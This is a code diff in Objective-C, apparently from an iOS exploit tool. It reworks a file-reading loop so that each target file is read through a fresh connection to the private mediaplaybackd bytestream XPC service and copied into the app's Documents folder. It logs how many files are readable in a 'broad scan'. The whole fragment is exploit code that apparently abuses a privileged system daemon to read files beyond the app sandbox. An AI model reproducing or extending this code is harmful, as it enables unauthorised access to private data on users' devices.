@@ -550,9 +550,26 @@ static NSString *KPBSSHA256(NSData *data) {
         for (NSString *t in targets) {
             NSString *outName = [@"bs-" stringByAppendingString:t.lastPathComponent];
             NSURL *outURL = [NSURL fileURLWithPath:[documents stringByAppendingPathComponent:outName]];
-            BOOL ok = [session readTarget:t output:outURL];
+            // Fresh session per file — connection must be alive
+            KPByteStreamSession *s2 = [[KPByteStreamSession alloc] init];
+            s2.journalFD = journalFD;
+            s2.report = [NSMutableString string];
+            if (!gBSAPI.ready) { [session log:@"SCAN SKIP (no API): %@", t.lastPathComponent]; continue; }
+            s2.connection = gBSAPI.connectionCreate("com.apple.coremedia.mediaplaybackd.bytestream.xpc", NULL, 0);
+            if (!s2.connection) { [session log:@"SCAN FAIL (no conn): %@", t.lastPathComponent]; continue; }
+            xpc_connection_set_event_handler(s2.connection, ^(xpc_object_t e) {});
+            xpc_connection_resume(s2.connection);
+            BOOL hs = [s2 performHandshake];
+            if (!hs) {
+                [session log:@"SCAN FAIL (handshake): %@", t.lastPathComponent];
+                xpc_connection_cancel(s2.connection);
+                continue;
+            }
+            BOOL ok = [s2 readTarget:t output:outURL];
             [session log:@"SCAN %@ : %@", ok ? @"READ" : @"FAIL", t.lastPathComponent];
             if (ok) readOK2++;
+            xpc_connection_cancel(s2.connection);
+            s2.connection = NULL;
         }
         [session log:@"BROAD_SCAN: %d/%lu files readable", readOK2, (unsigned long)targets.count];
         @synchronized (session) {
